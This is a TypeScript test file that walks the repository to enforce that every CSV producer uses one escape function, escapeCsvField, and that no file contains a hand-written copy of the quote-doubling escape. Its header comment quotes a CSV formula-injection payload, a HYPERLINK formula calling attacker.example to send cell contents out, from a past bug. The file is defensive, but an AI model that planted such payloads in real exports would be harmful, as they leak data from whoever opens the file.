import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join, relative, resolve, sep } from 'node:path';

/**
 * EVERY CSV THIS APPLICATION WRITES GOES THROUGH ONE ESCAPE.
 *
 * ## Why a repo-wide guard and not another unit test
 *
 * `escapeCsvField` already had unit tests, and they proved it correct for
 * three stages while a fourth surface quietly bypassed it.
 * `AuditExportPanel.tsx` re-implemented half of it — the quote-doubling kept,
 * the formula-lead guard dropped — so a matter a reviewer had named
 * `=HYPERLINK("https://attacker.example/"&A1&B1,"Open")` executed when an
 * ADMINISTRATOR opened the audit extract. `grep -rn escapeCsvField` returned
 * three files and the panel was not one of them; nothing in the suite looked.
 *
 * That is `CLAUDE.md`'s sibling-drift rule failing at the third copy, over an
 * extraction that already existed and that the previous stage had already
 * reused correctly. The lesson the project keeps re-learning is that an
 * extraction is only protected by something that notices the next copy, so
 * this file notices it.
 *
 * ## The two rules
 *
 *  1. A file that writes a `text/csv` blob must go through `escapeCsvField` —
 *     either by importing it or by being the module that defines it.
 *  2. Nothing outside that module may contain the RFC 4180 quote-doubling
 *     idiom, because that idiom is the signature of a re-implementation, and
 *     the half that gets dropped when someone writes it from memory is always
 *     the formula guard: quoting is what a person remembers CSV needing, and
 *     `'` before a leading `=` is what they do not.
 *
 * Neither rule is a substitute for the other. A future writer could import
 * the escape and then not call it (rule 1 blind), or write a producer whose
 * blob is made somewhere else (rule 2 catches the escape, not the omission).
 * Together they cover the shape that actually shipped.
 */

const SRC = resolve(__dirname, '..');

/** Where the escape lives. The one file both rules exempt, and the only one. */
const DEFINER = 'features/tabular/csv.ts';

/** The blob type every CSV download in this app is built with. */
const CSV_MIME = /['"`]text\/csv/;

/** RFC 4180 quote doubling, written by hand. The lead-in `"` of the wrapping
 *  template is deliberately not required: what is being detected is the
 *  escape, in any spelling of the surrounding string. */
const QUOTE_DOUBLING = /\.replace\(\s*\/"\/g\s*,\s*['"`]""/;

/** An `import` of the escape — the STATEMENT, not the word. Matching the bare
 *  identifier would let a file pass on the strength of naming
 *  `escapeCsvField` in a comment, which is exactly the kind of near-miss this
 *  guard exists to stop being possible. */
const IMPORTS_ESCAPE = /import\s*\{[^}]*\bescapeCsvField\b[^}]*\}\s*from/;

function walk(root: string): string[] {
  const out: string[] = [];
  const step = (dir: string): void => {
    for (const entry of readdirSync(dir)) {
      const full = join(dir, entry);
      if (statSync(full).isDirectory()) { step(full); continue; }
      const rel = relative(root, full).split(sep).join('/');
      if (!/\.tsx?$/.test(rel)) continue;
      if (/\.test\.tsx?$/.test(rel)) continue;
      if (rel.startsWith('test/')) continue;
      out.push(rel);
    }
  };
  step(root);
  return out.sort();
}

const FILES = walk(SRC).map(rel => ({ rel, source: readFileSync(join(SRC, rel), 'utf8') }));

describe('the walk finds what it claims to scan', () => {
  /*
   * THE SANITY CHECKS, and they are not decoration. Three guards in this
   * repository have reported green while pointed at a directory that no
   * longer held the code — `importBoundary` frozen at one stage,
   * `workspaceScope` missing a table, `stage1DoD` walking one root of two. A
   * scan is only worth its assertion if something fails when the scan itself
   * stops reaching the files.
   */
  it('reads a real, substantial slice of src/', () => {
    expect(FILES.length).toBeGreaterThan(100);
  });

  it('reaches the module that defines the escape', () => {
    const definer = FILES.find(f => f.rel === DEFINER);
    expect(definer, `${DEFINER} was not found by the walk`).toBeDefined();
    expect(definer!.source).toContain('export function escapeCsvField');
  });

  it('reaches all three CSV producers by name', () => {
    // Named individually rather than counted: a count passes when one
    // producer is deleted and another added, which is exactly the drift this
    // file exists to notice.
    const producers = FILES.filter(f => CSV_MIME.test(f.source)).map(f => f.rel);
    expect(producers).toContain(DEFINER);
    expect(producers).toContain('features/review/exportHistoryCsv.ts');
    expect(producers).toContain('features/admin/AuditExportPanel.tsx');
  });
});

describe('every CSV producer escapes through one function', () => {
  it('imports escapeCsvField, or is the module that defines it', () => {
    const offenders = FILES
      .filter(f => CSV_MIME.test(f.source))
      .filter(f => f.rel !== DEFINER)
      .filter(f => !IMPORTS_ESCAPE.test(f.source))
      .map(f => f.rel);
    expect(offenders, 'a CSV producer that does not go through escapeCsvField — '
      + 'quoting protects column alignment, not formula evaluation').toEqual([]);
  });

  it('holds no second copy of the quote-doubling escape', () => {
    const offenders = FILES
      .filter(f => f.rel !== DEFINER)
      .filter(f => QUOTE_DOUBLING.test(f.source))
      .map(f => f.rel);
    expect(offenders, 'a hand-written CSV escape outside features/tabular/csv.ts — '
      + 'this is the shape that dropped the formula-lead guard once already').toEqual([]);
  });
});

describe('the rules themselves catch what they are written for', () => {
  /*
   * The scan patterns exercised against literal sources, so a regex that
   * stopped matching anything would fail HERE rather than reporting an empty
   * offender list over the whole repository — the failure mode every stale
   * guard in this project has had.
   */
  it('detects the exact source AuditExportPanel shipped', () => {
    const shipped = 'const cell = (v: string | number | undefined): string =>\n'
      + '  `"${String(v ?? \'\').replace(/"/g, \'""\')}"`;';
    expect(QUOTE_DOUBLING.test(shipped)).toBe(true);
  });

  it('detects a double-quoted and a backtick spelling of the same escape', () => {
    expect(QUOTE_DOUBLING.test('v.replace(/"/g, """")')).toBe(true);
    expect(QUOTE_DOUBLING.test('v.replace(/"/g, `""`)')).toBe(true);
  });

  it('detects a text/csv blob in either quote style', () => {
    expect(CSV_MIME.test("new Blob([csv], { type: 'text/csv' })")).toBe(true);
    expect(CSV_MIME.test('new Blob([csv], { type: "text/csv;charset=utf-8;" })')).toBe(true);
  });

  it('reads an import statement, not the identifier in a comment', () => {
    expect(IMPORTS_ESCAPE.test("import { escapeCsvField } from '../tabular/csv';")).toBe(true);
    expect(IMPORTS_ESCAPE.test(
      "import { escapeCsvField, buildTabularCsv as buildCsv } from './csv';")).toBe(true);
    expect(IMPORTS_ESCAPE.test('// half of `escapeCsvField`, with the guard dropped')).toBe(false);
  });

  it('does not fire on unrelated replaces or on the word csv in prose', () => {
    expect(QUOTE_DOUBLING.test("name.replace(/\"/g, '')")).toBe(false);
    expect(QUOTE_DOUBLING.test("text.replace(/'/g, \"''\")")).toBe(false);
    expect(CSV_MIME.test('// the CSV export and the DOCX report agree')).toBe(false);
  });
});
